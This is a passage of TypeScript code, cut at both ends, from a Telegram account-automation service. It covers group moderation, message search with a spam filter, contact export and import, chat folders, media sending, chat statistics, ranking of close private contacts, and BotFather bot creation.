this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditBanned({\n            channel: channel,\n            participant: user,\n            bannedRights: new Api.ChatBannedRights({\n                untilDate: 0,\n                viewMessages: false,\n                sendMessages: false,\n                sendMedia: false,\n                sendStickers: false,\n                sendGifs: false,\n                sendGames: false,\n                sendInline: false,\n                embedLinks: false\n            })\n        }));\n    }\n\n    async getGroupAdmins(groupId: string): Promise<Array<{\n        userId: string;\n        rank?: string;\n        permissions: {\n            changeInfo: boolean;\n            postMessages: boolean;\n            editMessages: boolean;\n            deleteMessages: boolean;\n            banUsers: boolean;\n            inviteUsers: boolean;\n            pinMessages: boolean;\n            addAdmins: boolean;\n            anonymous: boolean;\n            manageCall: boolean;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.GetParticipants({\n            channel: await this.client.getInputEntity(groupId),\n            filter: new Api.ChannelParticipantsAdmins(),\n            offset: 0,\n            limit: 100,\n            hash: bigInt(0)\n        }));\n\n        if ('users' in result) {\n            const participants = result.participants as Api.ChannelParticipantAdmin[];\n            const users = result.users;\n\n            return participants.map(participant => {\n                const adminRights = participant.adminRights as Api.ChatAdminRights;\n                return {\n                    userId: participant.userId.toString(),\n                    rank: participant.rank || '',\n                    permissions: {\n                        changeInfo: adminRights.changeInfo || false,\n                        postMessages: adminRights.postMessages || false,\n                        editMessages: adminRights.editMessages || false,\n                        deleteMessages: adminRights.deleteMessages || false,\n                        banUsers: adminRights.banUsers || false,\n                        inviteUsers: adminRights.inviteUsers || false,\n                        pinMessages: adminRights.pinMessages || false,\n                        addAdmins: adminRights.addAdmins || false,\n                        anonymous: adminRights.anonymous || false,\n                        manageCall: adminRights.manageCall || false\n                    }\n                };\n            });\n        }\n        return [];\n    }\n\n    async getGroupBannedUsers(groupId: string): Promise<Array<{\n        userId: string;\n        bannedRights: {\n            viewMessages: boolean;\n            sendMessages: boolean;\n            sendMedia: boolean;\n            sendStickers: boolean;\n            sendGifs: boolean;\n            sendGames: boolean;\n            sendInline: boolean;\n            embedLinks: boolean;\n            untilDate: number;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.GetParticipants({\n            channel: await this.client.getInputEntity(groupId),\n            filter: new Api.ChannelParticipantsBanned({ q: '' }),\n            offset: 0,\n            limit: 100,\n            hash: bigInt(0)\n        }));\n\n        if ('users' in result) {\n            const participants = result.participants as Api.ChannelParticipantBanned[];\n\n            return participants.map(participant => {\n                const bannedRights = participant.bannedRights as Api.ChatBannedRights;\n                return {\n                    userId: (participant.peer as Api.PeerChat).chatId.toString(),\n                    bannedRights: {\n                        viewMessages: bannedRights.viewMessages || false,\n                        sendMessages: bannedRights.sendMessages || false,\n                        sendMedia: bannedRights.sendMedia || false,\n                        sendStickers: bannedRights.sendStickers || false,\n                        sendGifs: bannedRights.sendGifs || false,\n                        sendGames: bannedRights.sendGames || false,\n                        sendInline: bannedRights.sendInline || false,\n                        embedLinks: bannedRights.embedLinks || false,\n                        untilDate: bannedRights.untilDate || 0\n                    }\n                };\n            });\n        }\n        return [];\n    }\n\n    async searchMessages(params: SearchMessagesDto): Promise<SearchMessagesResponseDto> {\n        if (!this.client) throw new Error('Client not initialized');\n        const finalResult = {\n            video: { messages: [], total: 0 },\n            photo: { messages: [], total: 0 },\n            document: { messages: [], total: 0 },\n            voice: { messages: [], total: 0 },\n            text: { messages: [], total: 0 },\n            all: { messages: [], total: 0 },\n            roundVideo: { messages: [], total: 0 },\n            roundVoice: { messages: [], total: 0 },\n        }\n        const { chatId, query = '', types, maxId, minId, limit } = params;\n        console.log(\"Types: \", types);\n        for (const type of types) {\n            const filter = this.getSearchFilter(type);\n            const queryFilter = {\n                limit: limit || 500,\n                ...(maxId ? { maxId } : {}),\n                ...(minId ? { minId } : {}),\n            };\n\n            console.log(type, queryFilter);\n            const searchQuery = {\n                q: query,\n                filter: filter,\n                ...queryFilter,\n                hash: bigInt(0),\n                fromId: undefined\n            }\n            if (chatId) {\n                searchQuery['peer'] = await this.safeGetEntity(chatId);\n            }\n            const result = await this.client.invoke(\n                new Api.messages.Search(searchQuery)\n            );\n\n            if (!('messages' in result)) {\n                return {};\n            }\n            let messages = result.messages;\n            console.log(type, result.messages.length, result[\"count\"]);\n            if (types.includes(MessageMediaType.TEXT) && types.length === 1) {\n                console.log(\"Text Filter\");\n                messages = messages.filter((msg: Api.Message) => !('media' in msg));\n            }\n            const processedMessages = await Promise.all(messages.map(async (message: Api.Message) => {\n                const unwantedTexts = [\n                    'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',\n                    'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',\n                    'invite link', 'invitation', 'invitation link', 'demo', 'earn', 'book', 'paper', 'pay',\n                    'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray', \n                    'mdisk', 'diskwala', 'tera', 'online', 'watch', 'click', 'episode', 'season', 'part', 'action',\n                    'adventure', 'comedy', 'drama', 'fantasy', 'horror', 'mystery', 'romance', 'sci-fi', 'thriller',\n                    'demo', 'dress', 'netlify','service', 'follow', 'like', 'comment', 'share', 'subscribe',\n                    'premium', 'premium', 'unlock', 'access', 'exclusive', 'limited', 'offer', 'deal',\n                    'discount', 'sale', 'free trial', 'free access', 'free download', 'free gift', 'freebie',\n                    'crypto', 'currency', 'coin', 'blockchain', 'wallet', 'exchange', 'trading', 'investment',\n                ]\n                if (message.media && message.media instanceof Api.MessageMediaDocument) {\n                    const document = message.media.document as Api.Document;\n                    const fileNameAttr = document.attributes.find(attr => attr instanceof Api.DocumentAttributeFilename);\n                    const fileName = fileNameAttr && fileNameAttr instanceof Api.DocumentAttributeFilename ? fileNameAttr.fileName : '';\n                    const fileNameText = fileName.toLowerCase();\n                    const isWantedFile = !contains(fileNameText, unwantedTexts);\n                    return isWantedFile ? message.id : null;\n                } else {\n                    const messageText = (message.text || '').toLowerCase();\n                    const containsFilteredContent = contains(messageText, unwantedTexts);\n                    return !containsFilteredContent ? message.id : null;\n                }\n            }));\n\n            const filteredMessages = processedMessages.filter(id => id !== null);\n            const localResult = {\n                messages: filteredMessages,\n                total: result[\"count\"] ? result['count'] : filteredMessages.length\n            }\n            finalResult[`${type}`] = localResult;\n        }\n        return finalResult\n    }\n\n    async getAllMediaMetaData(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n        const { chatId, types = ['photo', 'video'], startDate, endDate, maxId, minId } = params;\n        let allMedia: any[] = [];\n        let hasMore = true;\n        let lastOffsetId = 0;\n        const limit = 200;\n\n        while (hasMore) {\n            const response = await this.getMediaMetadata({\n                chatId,\n                types,\n                startDate,\n                endDate,\n                limit,\n                maxId: lastOffsetId,\n                minId\n            });\n            console.log(\"hasMore: \", response.hasMore, \"Total: \", response.total, \"lastOffsetId: \", response.lastOffsetId);\n            allMedia = allMedia.concat(response.messages);\n\n            if (!response.hasMore) {\n                hasMore = false;\n                console.log('No more messages to fetch');\n            } else {\n                lastOffsetId = response.lastOffsetId;\n                console.log(`Fetched ${allMedia.length} messages so far`);\n            }\n            await sleep(3000);\n        }\n\n        return {\n            messages: allMedia,\n            total: allMedia.length,\n        };\n    }\n\n    async getFilteredMedia(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        limit?: number;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;\n\n        const query: Partial<IterMessagesParams> = {\n            limit: limit || 100,\n            ...(maxId ? { maxId } : {}),\n            ...(minId ? { minId } : {}),\n            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),\n            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })\n        };\n\n        const ent = await this.safeGetEntity(chatId);\n        console.log(query);\n        const messages = await this.client.getMessages(ent, query);\n        console.log(`Fetched ${messages.length} messages`);\n\n        const filteredMessages = messages.filter(message => {\n            if (!message.media) return false;\n            const mediaType = this.getMediaType(message.media);\n            return types.includes(mediaType);\n        });\n\n        console.log(`Filtered down to ${filteredMessages.length} messages`);\n        const mediaData = await Promise.all(filteredMessages.map(async (message: Api.Message) => {\n            let thumbBuffer = null;\n\n            try {\n                if (message.media instanceof Api.MessageMediaPhoto) {\n                    const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n                    thumbBuffer = await this.downloadWithTimeout(\n                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,\n                        5000\n                    );\n                } else if (message.media instanceof Api.MessageMediaDocument) {\n                    const sizes = message.document?.thumbs || [1];\n                    thumbBuffer = await this.downloadWithTimeout(\n                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,\n                        5000\n                    );\n                }\n            } catch (error) {\n                console.warn(`Failed to get thumbnail for message ${message.id}:`, error.message);\n            }\n\n            const mediaDetails = await this.getMediaDetails(message.media as Api.MessageMediaDocument);\n\n            return {\n                messageId: message.id,\n                type: this.getMediaType(message.media),\n                thumb: thumbBuffer?.toString('base64') || null,\n                caption: message.message || '',\n                date: message.date,\n                mediaDetails,\n            };\n        }));\n\n        return {\n            messages: mediaData,\n            total: messages.total,\n            hasMore: messages.length === limit\n        };\n    }\n\n    async safeGetEntity(entityId: string): Promise<Api.TypeUser | Api.TypeChat | Api.PeerChannel | null> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        try {\n            return await this.client.getEntity(entityId);\n        } catch (error) {\n            console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);\n\n            try {\n                const dialogs = await this.client.getDialogs({\n                    limit: 300\n                });\n                for (const dialog of dialogs) {\n                    const entity = dialog.entity;\n                    if (entity.id.toString() === entityId.toString()) {\n                        return entity;\n                    }\n                }\n\n                console.log(`Entity ${entityId} not found in dialogs either`);\n                return null;\n            } catch (dialogError) {\n                console.error('Error while searching dialogs:', dialogError);\n                return null;\n            }\n        }\n    }\n\n    // Contact Management Features\n    private generateCSV(contacts: Array<{ firstName: string, lastName: string, phone: string, blocked: boolean }>) {\n        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');\n        const rows = contacts.map(contact => [\n            contact.firstName,\n            contact.lastName,\n            contact.phone,\n            contact.blocked\n        ].join(','));\n\n        return [header, ...rows].join('\\n');\n    }\n\n    private generateVCard(contacts: any[]) {\n        return contacts.map(contact => {\n            const vcard = [\n                'BEGIN:VCARD',\n                'VERSION:3.0',\n                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),\n                `TEL;TYPE=CELL:${contact.phone || ''}`,\n                'END:VCARD'\n            ];\n            return vcard.join('\\n');\n        }).join('\\n\\n');\n    }\n\n    async exportContacts(format: 'vcard' | 'csv', includeBlocked: boolean = false) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));\n        const contacts = contactsResult?.contacts || [];\n\n        let blockedContacts;\n        if (includeBlocked) {\n            blockedContacts = await this.client.invoke(new Api.contacts.GetBlocked({\n                offset: 0,\n                limit: 100\n            }));\n        }\n\n        if (format === 'csv') {\n            const csvData = contacts.map((contact: any) => ({\n                firstName: contact.firstName || '',\n                lastName: contact.lastName || '',\n                phone: contact.phone || '',\n                blocked: blockedContacts ? blockedContacts.peers.some((p: any) =>\n                    p.id.toString() === contact.id.toString()\n                ) : false\n            }));\n            return this.generateCSV(csvData);\n        } else {\n            return this.generateVCard(contacts);\n        }\n    }\n\n    async importContacts(data: { firstName: string; lastName?: string; phone: string }[]) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const results = await Promise.all(data.map(async contact => {\n            try {\n                await this.client.invoke(new Api.contacts.ImportContacts({\n                    contacts: [new Api.InputPhoneContact({\n                        clientId: bigInt(Math.floor(Math.random() * 1000000)),\n                        phone: contact.phone,\n                        firstName: contact.firstName,\n                        lastName: contact.lastName || ''\n                    })]\n                }));\n                return { success: true, phone: contact.phone };\n            } catch (error) {\n                return { success: false, phone: contact.phone, error: error.message };\n            }\n        }));\n\n        return results;\n    }\n\n    async manageBlockList(userIds: string[], block: boolean) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const results = await Promise.all(userIds.map(async userId => {\n            try {\n                if (block) {\n                    await this.client.invoke(new Api.contacts.Block({\n                        id: await this.client.getInputEntity(userId)\n                    }));\n                } else {\n                    await this.client.invoke(new Api.contacts.Unblock({\n                        id: await this.client.getInputEntity(userId)\n                    }));\n                }\n                return { success: true, userId };\n            } catch (error) {\n                return { success: false, userId, error: error.message };\n            }\n        }));\n\n        return results;\n    }\n\n    async getContactStatistics() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));\n        const contacts = contactsResult?.contacts || [];\n\n        const onlineContacts = contacts.filter((c: any) => c.status && 'wasOnline' in c.status);\n\n        return {\n            total: contacts.length,\n            online: onlineContacts.length,\n            withPhone: contacts.filter((c: any) => c.phone).length,\n            mutual: contacts.filter((c: any) => c.mutual).length,\n            lastWeekActive: onlineContacts.filter((c: any) => {\n                const lastSeen = new Date(c.status.wasOnline * 1000);\n                const weekAgo = new Date();\n                weekAgo.setDate(weekAgo.getDate() - 7);\n                return lastSeen > weekAgo;\n            }).length\n        };\n    }\n\n    // Chat Folder Management\n    async createChatFolder(options: {\n        name: string,\n        includedChats: string[],\n        excludedChats?: string[],\n        includeContacts?: boolean,\n        includeNonContacts?: boolean,\n        includeGroups?: boolean,\n        includeBroadcasts?: boolean,\n        includeBots?: boolean,\n        excludeMuted?: boolean,\n        excludeRead?: boolean,\n        excludeArchived?: boolean\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const folder = new Api.DialogFilter({\n            id: Math.floor(Math.random() * 1000),\n            title: options.name,\n            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),\n            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),\n            pinnedPeers: [],\n            contacts: options.includeContacts ?? true,\n            nonContacts: options.includeNonContacts ?? true,\n            groups: options.includeGroups ?? true,\n            broadcasts: options.includeBroadcasts ?? true,\n            bots: options.includeBots ?? true,\n            excludeMuted: options.excludeMuted ?? false,\n            excludeRead: options.excludeRead ?? false,\n            excludeArchived: options.excludeArchived ?? false\n        });\n\n        await this.client.invoke(new Api.messages.UpdateDialogFilter({\n            id: folder.id,\n            filter: folder\n        }));\n\n        return {\n            id: folder.id,\n            name: options.name,\n            options: {\n                includeContacts: folder.contacts,\n                includeNonContacts: folder.nonContacts,\n                includeGroups: folder.groups,\n                includeBroadcasts: folder.broadcasts,\n                includeBots: folder.bots,\n                excludeMuted: folder.excludeMuted,\n                excludeRead: folder.excludeRead,\n                excludeArchived: folder.excludeArchived\n            }\n        };\n    }\n\n    async getChatFolders() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const filters = await this.client.invoke(new Api.messages.GetDialogFilters());\n        return filters.map((filter: any) => ({\n            id: filter.id ?? 0,\n            title: filter.title ?? '',\n            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,\n            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0\n        }));\n    }\n\n    async sendMediaBatch(options: {\n        chatId: string;\n        media: Array<{\n            type: 'photo' | 'video' | 'document';\n            url: string;\n            caption?: string;\n            fileName?: string;\n        }>;\n        silent?: boolean;\n        scheduleDate?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const mediaFiles = await Promise.all(\n            options.media.map(async (item) => {\n                const buffer = await this.downloadFileFromUrl(item.url);\n                const file = new CustomFile(\n                    item.fileName || `media.${this.getMediaExtension(item.type)}`,\n                    buffer.length,\n                    'media',\n                    buffer\n                );\n\n                const uploadedFile = await this.client.uploadFile({\n                    file,\n                    workers: 1\n                });\n\n                const inputMedia = item.type === 'photo' ?\n                    new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :\n                    new Api.InputMediaUploadedDocument({\n                        file: uploadedFile,\n                        mimeType: this.getMimeType(item.type),\n                        attributes: this.getMediaAttributes(item)\n                    });\n\n                return new Api.InputSingleMedia({\n                    media: inputMedia,\n                    message: item.caption || '',\n                    entities: []\n                });\n            })\n        );\n\n        return this.client.invoke(new Api.messages.SendMultiMedia({\n            peer: options.chatId,\n            multiMedia: mediaFiles,\n            silent: options.silent,\n            scheduleDate: options.scheduleDate\n        }));\n    }\n\n    private getMimeType(type: string): string {\n        switch (type) {\n            case 'photo': return 'image/jpeg';\n            case 'video': return 'video/mp4';\n            case 'document': return 'application/octet-stream';\n            default: return 'application/octet-stream';\n        }\n    }\n\n    private getMediaAttributes(item: { type: string, fileName?: string }): Api.TypeDocumentAttribute[] {\n        const attributes: Api.TypeDocumentAttribute[] = [];\n\n        if (item.fileName) {\n            attributes.push(new Api.DocumentAttributeFilename({\n                fileName: item.fileName\n            }));\n        }\n\n        if (item.type === 'video') {\n            attributes.push(new Api.DocumentAttributeVideo({\n                duration: 0,\n                w: 1280,\n                h: 720,\n                supportsStreaming: true\n            }));\n        }\n\n        return attributes;\n    }\n\n    async editMessage(options: {\n        chatId: string;\n        messageId: number;\n        text?: string;\n        media?: {\n            type: 'photo' | 'video' | 'document';\n            url: string;\n        };\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        if (options.media) {\n            const buffer = await this.downloadFileFromUrl(options.media.url);\n            const file = new CustomFile(\n                `media.${this.getMediaExtension(options.media.type)}`,\n                buffer.length,\n                'media',\n                buffer\n            );\n\n            const uploadedFile = await this.client.uploadFile({\n                file,\n                workers: 1\n            });\n\n            const inputMedia = options.media.type === 'photo' ?\n                new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :\n                new Api.InputMediaUploadedDocument({\n                    file: uploadedFile,\n                    mimeType: this.getMimeType(options.media.type),\n                    attributes: this.getMediaAttributes(options.media)\n                });\n\n            return this.client.invoke(new Api.messages.EditMessage({\n                peer: options.chatId,\n                id: options.messageId,\n                media: inputMedia,\n                message: options.text || ''\n            }));\n        }\n\n        if (options.text) {\n            return this.client.invoke(new Api.messages.EditMessage({\n                peer: options.chatId,\n                id: options.messageId,\n                message: options.text\n            }));\n        }\n\n        throw new Error('Either text or media must be provided');\n    }\n\n    async getChats(options: {\n        limit?: number;\n        offsetDate?: number;\n        offsetId?: number;\n        offsetPeer?: string;\n        folderId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const dialogs = await this.client.getDialogs({\n            ...options,\n            limit: options.limit || 100\n        });\n\n        return Promise.all(dialogs.map(async (dialog) => {\n            const entity = dialog.entity;\n            return {\n                id: entity.id.toString(),\n                title: 'title' in entity ? entity.title : null,\n                username: 'username' in entity ? entity.username : null,\n                type: entity instanceof Api.User ? 'user' :\n                    entity instanceof Api.Chat ? 'group' :\n                        entity instanceof Api.Channel ? 'channel' : 'unknown',\n                unreadCount: dialog.unreadCount,\n                lastMessage: dialog.message ? {\n                    id: dialog.message.id,\n                    text: dialog.message.message,\n                    date: new Date(dialog.message.date * 1000)\n                } : null\n            };\n        }));\n    }\n\n    async updateChatSettings(settings: {\n        chatId: string;\n        username?: string;\n        title?: string;\n        about?: string;\n        photo?: string;\n        slowMode?: number;\n        linkedChat?: string;\n        defaultSendAs?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const chat = await this.client.getEntity(settings.chatId);\n\n        const updates: Promise<any>[] = [];\n\n        if (settings.title) {\n            updates.push(this.client.invoke(new Api.channels.EditTitle({\n                channel: chat,\n                title: settings.title\n            })));\n        }\n\n        if (settings.about) {\n            updates.push(this.client.invoke(new Api.messages.EditChatAbout({\n                peer: chat,\n                about: settings.about\n            })));\n        }\n\n        if (settings.photo) {\n            const buffer = await this.downloadFileFromUrl(settings.photo);\n            const file = await this.client.uploadFile({\n                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\n                workers: 1\n            });\n\n            updates.push(this.client.invoke(new Api.channels.EditPhoto({\n                channel: chat,\n                photo: new Api.InputChatUploadedPhoto({\n                    file: file\n                })\n            })));\n        }\n\n        if (settings.slowMode !== undefined) {\n            updates.push(this.client.invoke(new Api.channels.ToggleSlowMode({\n                channel: chat,\n                seconds: settings.slowMode\n            })));\n        }\n\n        if (settings.linkedChat) {\n            const linkedChannel = await this.client.getEntity(settings.linkedChat);\n            updates.push(this.client.invoke(new Api.channels.SetDiscussionGroup({\n                broadcast: chat,\n                group: linkedChannel\n            })));\n        }\n\n        if (settings.username) {\n            updates.push(this.client.invoke(new Api.channels.UpdateUsername({\n                channel: chat,\n                username: settings.username\n            })));\n        }\n\n        await Promise.all(updates);\n        return true;\n    }\n\n    async getMessageStats(options: {\n        chatId: string;\n        period: 'day' | 'week' | 'month';\n        fromDate?: Date;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const now = options.fromDate || new Date();\n        const startDate = new Date(now);\n\n        switch (options.period) {\n            case 'day':\n                startDate.setDate(startDate.getDate() - 1);\n                break;\n            case 'week':\n                startDate.setDate(startDate.getDate() - 7);\n                break;\n            case 'month':\n                startDate.setMonth(startDate.getMonth() - 1);\n                break;\n        }\n\n        const messages = await this.client.getMessages(options.chatId, {\n            limit: 100,\n            offsetDate: Math.floor(now.getTime() / 1000),\n        });\n\n        const stats = {\n            total: messages.length,\n            withMedia: 0,\n            withLinks: 0,\n            withForwards: 0,\n            byHour: new Array(24).fill(0),\n            byType: {\n                text: 0,\n                photo: 0,\n                video: 0,\n                document: 0,\n                other: 0\n            }\n        };\n\n        for (const msg of messages) {\n            const hour = new Date(msg.date * 1000).getHours();\n            stats.byHour[hour]++;\n\n            if (msg.media) {\n                stats.withMedia++;\n                const mediaType = this.getMediaType(msg.media);\n                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;\n            } else if (msg.message) {\n                if (msg.message.match(/https?:\\/\\/[^\\s]+/)) {\n                    stats.withLinks++;\n                }\n                stats.byType.text++;\n            }\n\n            if (msg.fwdFrom) {\n                stats.withForwards++;\n            }\n        }\n\n        return stats;\n    }\n\n    async getTopPrivateChats(): Promise<Array<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        console.log('Starting getTopPrivateChats analysis...');\n        const startTime = Date.now();\n\n        // Weighting factors for different interaction types\n        const weights = {\n            videoCall: 15,      // Video calls have highest weight due to high engagement\n            incoming: 5,\n            outgoing: 1,       // Audio calls indicate strong connection\n            sharedVideo: 6,     // Videos show high interaction intent\n            sharedPhoto: 4,     // Photos show moderate interaction\n            textMessage: 1,     // Base weight for messages\n        };\n\n        console.log('Fetching dialogs...');\n        const dialogs = await this.client.getDialogs({\n            limit: 200 // Reduced from 500 for better performance\n        });\n        console.log(`Found ${dialogs.length} total dialogs`);\n\n        // Filter private chats more strictly\n        const privateChats = dialogs.filter(dialog =>\n            dialog.isUser &&\n            dialog.entity instanceof Api.User &&\n            !dialog.entity.bot && // Explicitly exclude bots\n            !dialog.entity.fake && // Exclude fake accounts\n            dialog.entity.id.toString() !== \"777000\" && // Exclude Telegram's service notifications\n            dialog.entity.id.toString() !== \"42777\" // Exclude Telegram's support account\n        );\n\n        console.log(`Found ${privateChats.length} valid private chats after filtering`);\n\n        // Calculate recent activity window (last month)\n        const now = Math.floor(Date.now() / 1000);\n        // const oneMonthAgo = now - (30 * 24 * 60 * 60);\n\n        // Process chats in batches to avoid overwhelming the API\n        const batchSize = 10;\n        const chatStats = [];\n        const callLogs = await this.getCallLogsInternal();\n        console.log(callLogs);\n        for (let i = 0; i < privateChats.length; i += batchSize) {\n            console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);\n            const batch = privateChats.slice(i, i + batchSize);\n\n            const batchResults = await Promise.all(batch.map(async (dialog) => {\n                const processingStart = Date.now();\n                const chatId = dialog.entity.id.toString();\n                const user = dialog.entity as Api.User;\n\n                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'}) last: ${dialog.message.id}`);\n\n                try {\n                    // Get recent messages with optimization\n                    const messages = await this.client.getMessages(chatId, {\n                        limit: 30,\n                    });\n\n                    // Skip chats with fewer than 20 messages\n                    if (messages.length < 20) {\n                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);\n                        return null;\n                    }\n\n                    const messageStats = await this.searchMessages({ chatId, types: [MessageMediaType.PHOTO, MessageMediaType.ROUND_VIDEO, MessageMediaType.VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE, MessageMediaType.CHAT_PHOTO], limit: 100 });\n                    console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);\n\n                    const callStats = {\n                        total: 0,\n                        incoming: 0,\n                        outgoing: 0,\n                        video: 0\n                    };\n\n                    const mediaStats = { photos: messageStats.photo.total, videos: messageStats?.video?.total || 0 + messageStats?.roundVideo?.total || 0 };\n                    const userCalls = callLogs[chatId];\n                    console.log(userCalls);\n                    if (userCalls) {\n                        callStats.total = userCalls.totalCalls;\n                        callStats.incoming = userCalls.incoming;\n                        callStats.outgoing = userCalls.outgoing;\n                    }\n\n                    // Calculate scores\n                    const interactionScore = (\n                        callStats.incoming * weights.incoming +\n                        callStats.outgoing * weights.outgoing +\n                        callStats.video * weights.videoCall +\n                        mediaStats.videos * weights.sharedVideo +\n                        mediaStats.photos * weights.sharedPhoto +\n                        messages.total * weights.textMessage\n                    )\n\n                    // Calculate activity breakdown\n                    const activityBreakdown = {\n                        videoCalls: (callStats.video * weights.videoCall) / interactionScore * 100,\n                        incoming: (callStats.incoming * weights.incoming) / interactionScore * 100,\n                        outgoing: (callStats.outgoing * weights.outgoing) / interactionScore * 100,\n                        mediaSharing: ((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto)) / interactionScore * 100,\n                        textMessages: (messages.total * weights.textMessage) / interactionScore * 100\n                    };\n\n                    const processingTime = Date.now() - processingStart;\n                    console.log(`Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);\n\n                    return {\n                        chatId,\n                        username: user.username,\n                        firstName: user.firstName,\n                        lastName: user.lastName,\n                        totalMessages: messages.total,\n                        interactionScore: Math.round(interactionScore * 100) / 100,\n                        calls: callStats,\n                        media: mediaStats,\n                        activityBreakdown\n                    };\n                } catch (error) {\n                    console.error(`Error processing chat ${chatId}:`, error);\n                    return null;\n                }\n            }));\n\n            chatStats.push(...batchResults.filter(Boolean));\n        }\n\n        // Sort by interaction score and get top 5\n        const topChats = chatStats\n            .sort((a, b) => b.interactionScore - a.interactionScore)\n            .slice(0, 10);\n\n        const totalTime = Date.now() - startTime;\n        console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);\n        topChats.forEach((chat, index) => {\n            console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);\n        });\n\n        return topChats;\n    }\n\n    async createGroupOrChannel(options: GroupOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n        try {\n            console.log('Creating group or channel with options:', options);\n            const result = await this.client.invoke(\n                new Api.channels.CreateChannel(options)\n            );\n            return result;\n        }\n        catch (error) {\n            console.error('Error creating group or channel:', error);\n            throw new Error(`Failed to create group or channel: ${error.message}`);\n        }\n    }\n\n    async createBot(options: {\n        name: string;\n        username: string;\n        description?: string;\n        aboutText?: string;\n        profilePhotoUrl?: string;\n    }): Promise<{ botToken: string; username: string }> {\n        if (!this.client) {\n            console.error('Bot creation failed: Client not initialized');\n            throw new Error('Client not initialized');\n        }\n\n        const botFatherUsername = 'BotFather';\n        console.log(`[BOT CREATION] Starting bot creation process for \"${options.name}\" (${options.username})`);\n\n        try {\n            // Start conversation with BotFather\n            console.log('[BOT CREATION] Attempting to get entity for BotFather...');\n            const entity = await this.client.getEntity(botFatherUsername);\n            console.log('[BOT CREATION] Successfully connected to BotFather');\n\n            // Send /newbot command\n            console.log('[BOT CREATION] Sending /newbot command...');\n            await this.client.sendMessage(entity, {\n                message: '/newbot'\n            });\n            console.log('[BOT CREATION] Waiting for BotFather response after /newbot command...');\n            await new Promise(resolve => setTimeout(resolve, 1000));\n\n            // Send bot name\n            console.log(`[BOT CREATION] Sending bot name: \"${options.name}\"`);\n            await this.client.sendMessage(entity, {\n                message: options.name\n            });\n            console.log('[BOT CREATION] Waiting for BotFather response after sending name...');\n            await new Promise(resolve => setTimeout(resolve, 1000));\n\n            // Send bot username\n            // Append a 3-digit unique string ending with \"_bot\" if not present\n            let botUsername = options.username;\n            if (!/_bot$/.test(botUsername)) {\n                // Generate a unique 3-character alphanumeric string\n                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';\n                let uniqueSuffix = '';\n                for (let i = 0; i < 3; i++) {\n                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * 